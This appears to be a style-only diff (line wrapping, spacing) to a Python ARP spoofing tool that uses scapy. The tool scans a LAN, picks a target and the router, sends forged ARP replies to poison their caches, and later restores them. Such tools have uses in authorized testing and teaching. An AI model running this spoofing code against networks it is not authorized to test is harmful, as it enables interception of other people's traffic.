@@ -65,7 +65,8 @@ class ARPSpoof(object):
         Check whether the input MAC is valid or not
         """
 
-        if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()):
+        if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$",
+                    mac.lower()):
             return True
 
     @staticmethod
@@ -84,8 +85,9 @@ class ARPSpoof(object):
 
         colors.info('Finding Router IP address...')
 
-        command_process = subprocess.Popen(['route', '-n'], stdout=subprocess.PIPE,
-                                            stderr=subprocess.PIPE)
+        command_process = subprocess.Popen(['route', '-n'],
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE)
         output, error = command_process.communicate()
 
         if error:
@@ -93,7 +95,8 @@ class ARPSpoof(object):
             sys.exit(1)
 
         output = output.decode('utf-8')
-        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", output)
+        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
+                                   output)
 
         colors.success('Router IP found is : {}'.format(ip_candidates[1]))
         val = str(input('>> Continue with this IP address(Y/y)'
@@ -114,8 +117,9 @@ class ARPSpoof(object):
         """
 
         if self.target_ip is None:
-            value = str(input('>> No target IP selected, please enter an IP address'
-                               'or run network scan (Enter "S/s") : ')).strip()
+            value = str(input('>> No target IP selected, please enter an IP '
+                              'address or run network scan (Enter "S/s") : '
+                              )).strip()
             if value == 'S' or value == 's':
                 self.networkScan()
             elif self.validateIP(value):
@@ -135,15 +139,19 @@ class ARPSpoof(object):
         arp_broadcast = broadcast/arp_packet
         broadcast = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
         mac_addr_str = self.capture_output(broadcast)
-        mac_addr = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', mac_addr_str)[0]
+        mac_addr = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w',
+                              mac_addr_str)[0]
         mac_addr = str(mac_addr).strip()
 
-        colors.success('Found MAC address for {} : {} is : {}'.format(name, IP, mac_addr))
-        val = str(input('>> Enter(Y/y) to continue or enter MAC address : ')).strip()
+        colors.success('Found MAC address for {} : {} is : {}'
+                       .format(name, IP, mac_addr))
+        val = str(input('>> Enter(Y/y) to continue or enter MAC address : '))\
+            .strip()
         if val == 'Y' or val == 'y':
             return mac_addr
         elif self.validateMAC(val):
-            colors.info('Setting MAC address for {} : {} : {}'.format(name, IP, val))
+            colors.info('Setting MAC address for {} : {} : {}'
+                        .format(name, IP, val))
             return val
         else:
             colors.error('Please enter a valid MAC address...')
@@ -154,7 +162,8 @@ class ARPSpoof(object):
         Peform ARP scanning over the IP range
         """
 
-        ip = str(input('>> Enter the IP address to start scanning : ')).strip()
+        ip = str(input('>> Enter the IP address to start scanning : '))\
+            .strip()
         if self.validateIP(ip):
             try:
                 colors.info('Initiating ARP Scan')
@@ -169,13 +178,13 @@ class ARPSpoof(object):
 
                 index = -1
                 while index > total_index or index <= 0:
-                    index = int(input('>> Enter the index of the target IP : '))
+                    index = int(input('>> Enter the index of the target IP: '))
 
                 self.target_ip = result_dict[index][0]
                 self.target_mac = result_dict[index][1]
 
-                colors.success('Target IP set to : {}'.format(self.target_ip))
-                colors.success('Target MAC set to : {}'.format(self.target_mac))
+                colors.success('Target IP set to: {}'.format(self.target_ip))
+                colors.success('Target MAC set to: {}'.format(self.target_mac))
 
             except ImportError:
                 colors.error('Could not import the required module.')
@@ -206,13 +215,17 @@ class ARPSpoof(object):
 
         colors.info('Restoring IP tables')
 
-        target_arp_packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
-                                            psrc=self.router_ip, hwsrc=self.router_mac)
+        target_arp_packet = scapy.ARP(op=2, pdst=self.target_ip,
+                                      hwdst=self.target_mac,
+                                      psrc=self.router_ip,
+                                      hwsrc=self.router_mac)
 
-        router_arp_packet = scapy.ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac,
-                                            psrc=self.target_ip, hwsrc=self.target_mac)
+        router_arp_packet = scapy.ARP(op=2, pdst=self.router_ip,
+                                      hwdst=self.router_mac,
+                                      psrc=self.target_ip,
+                                      hwsrc=self.target_mac)
 
-        COUNT = 10 # Send 10 packets to restore
+        COUNT = 10  # Send 10 packets to restore
 
         while COUNT > 0:
             scapy.send(target_arp_packet, verbose=False)
@@ -237,7 +250,8 @@ class ARPSpoof(object):
                 scapy.send(target_arp_packet, verbose=False)
                 scapy.send(router_arp_packet, verbose=False)
                 self.no_of_packets = self.no_of_packets + 1
-                print('[+] Packets sent : {}'.format(self.no_of_packets), end='\r')
+                print('[+] Packets sent : {}'.format(self.no_of_packets),
+                      end='\r')
                 time.sleep(self.INTER)
 
         except KeyboardInterrupt:
